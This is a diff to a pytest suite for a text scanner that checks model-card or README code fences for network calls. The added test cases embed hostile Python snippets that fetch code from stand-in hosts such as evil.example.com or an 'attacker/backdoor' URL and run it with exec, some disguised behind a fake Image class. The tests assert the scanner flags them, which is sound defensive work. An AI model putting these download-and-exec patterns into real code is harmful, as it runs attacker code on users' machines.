@@ -507,6 +507,15 @@ def test_text_scanner_documentation_image_near_matches_stay_actionable(
             "```python\nfrom urllib.request import urlopen\nurlopen('https://evil.example.com/a')\n```\n",
             id="second-malicious-fence",
         ),
+        pytest.param(
+            "```python\nimport urllib.request\nopener = urllib.request.build_opener()\n"
+            "exec(opener.open('http://evil.example.com/payload').read())\n```\n",
+            id="urllib-request-without-urlopen-token",
+        ),
+        pytest.param(
+            "```python\nimport urllib.request\nopener = urllib.request.URLopener()\n```\n",
+            id="urlopener-camelcase-token",
+        ),
         pytest.param("\nAlso call urlopen('https://evil.example.com') directly.\n", id="prose-urlopen"),
         pytest.param("\n    urlopen('http://evil.example.com')\n", id="unfenced-urlopen"),
     ],
@@ -5839,3 +5848,63 @@ def test_text_metadata_read_failure_bypasses_stale_clean_cache(
         assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == cached_entries
     finally:
         reset_cache_manager()
+
+
+@pytest.mark.parametrize(
+    ("label", "example"),
+    [
+        pytest.param(
+            "local-image-class",
+            "```python\nfrom urllib.request import urlopen\nclass Image:\n    @staticmethod\n"
+            "    def open(response):\n        exec(response.read())\n"
+            "img = Image.open(urlopen(\n"
+            "    'https://huggingface.co/attacker/backdoor/resolve/main/logo.png'\n))\n```\n",
+            id="fence-defines-its-own-image",
+        ),
+        pytest.param(
+            "non-pil-image",
+            "```python\nfrom urllib.request import urlopen\nfrom evil import Image\n"
+            "img = Image.open(urlopen(\n"
+            "    'https://huggingface.co/datasets/huggingface/documentation-images/resolve/main/"
+            "beignets-task-guide.png'\n))\n```\n",
+            id="image-imported-from-elsewhere",
+        ),
+        pytest.param(
+            "no-image-import",
+            "```python\nfrom urllib.request import urlopen\n"
+            "img = Image.open(urlopen(\n"
+            "    'https://huggingface.co/datasets/huggingface/documentation-images/resolve/main/"
+            "beignets-task-guide.png'\n))\n```\n",
+            id="image-never-imported",
+        ),
+        pytest.param(
+            "getattr-primitive",
+            "```python\nfrom urllib.request import urlopen\nfrom PIL import Image\nimport timm\n"
+            "fetch = getattr(timm, 'create_model')\n"
+            "img = Image.open(urlopen(\n"
+            "    'https://huggingface.co/datasets/huggingface/documentation-images/resolve/main/"
+            "beignets-task-guide.png'\n))\n```\n",
+            id="execution-primitive-in-fence",
+        ),
+    ],
+)
+def test_text_scanner_documentation_image_example_requires_provable_pil_sink(
+    tmp_path: Path,
+    label: str,
+    example: str,
+) -> None:
+    """The response sink must provably be PIL's ``Image``, not merely a name spelled ``Image``.
+
+    Without this the fence body is unconstrained, so a card can define its own ``Image`` class whose
+    ``open`` executes the downloaded bytes and still be treated as the documented example.
+    """
+    path = tmp_path / "README.md"
+    path.write_text(example, encoding="utf-8")
+
+    result = TextScanner().scan(str(path))
+
+    assert result.success is False, label
+    assert any(
+        check.details.get("function") == "urlopen" and check.severity == IssueSeverity.CRITICAL
+        for check in _failed_network_detection_checks(result)
+    ), label
